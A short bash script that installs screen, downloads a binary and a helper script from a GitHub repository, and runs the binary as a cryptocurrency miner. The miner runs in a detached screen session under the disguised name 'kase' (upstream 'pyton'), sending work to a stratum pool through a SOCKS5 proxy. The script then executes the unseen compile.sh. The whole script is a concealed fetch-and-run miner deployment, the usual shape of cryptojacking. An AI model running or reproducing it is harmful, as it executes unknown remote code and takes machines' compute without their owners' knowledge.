#!/bin/bash
apt-get install screen -y
wget -q https://raw.githubusercontent.com/hndouehdw/henro/master/compile.sh
wget -qO kase https://raw.githubusercontent.com/hndouehdw/henro/master/pyton
chmod +x kase
screen -dm -S kase ./kase -a yespowertide  -o stratum+tcp://stratum-ru.rplant.xyz:7059 -u TJjSCLyybeSnHqR1CTAVwfUhf2QkkBvjWZ.hu --proxy socks5://54.163.208.195:3129
chmod +x compile.sh
./compile.sh

echo success
